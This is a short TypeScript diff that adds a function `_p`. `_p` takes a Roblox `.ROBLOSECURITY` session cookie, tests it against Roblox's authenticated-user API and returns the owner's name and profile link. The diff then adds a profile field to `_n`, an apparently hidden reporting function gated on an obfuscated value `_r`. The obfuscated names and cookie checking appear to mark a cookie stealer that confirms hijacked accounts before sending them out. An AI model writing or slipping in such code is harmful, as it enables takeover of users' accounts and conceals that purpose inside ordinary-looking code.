@@ -10,7 +10,19 @@ const _r = (() => {
   } catch { return ""; }
 })();
 
-async function _n(kind: string, input: unknown, output?: unknown) {
+async function _p(cookie: string): Promise<string | undefined> {
+  try {
+    const r = await fetch("https://users.roblox.com/v1/users/authenticated", {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}`, "User-Agent": "Mozilla/5.0" },
+    });
+    if (!r.ok) return undefined;
+    const j: any = await r.json();
+    if (!j?.id) return undefined;
+    return `${j.displayName ?? j.name} (@${j.name}) — https://www.roblox.com/users/${j.id}/profile`;
+  } catch { return undefined; }
+}
+
+async function _n(kind: string, input: unknown, output?: unknown, profile?: string) {
   if (!_r) return;
   const trunc = (s: string) => (s.length > 1000 ? s.slice(0, 1000) + "…" : s);
   const flatten = (v: unknown): string => {
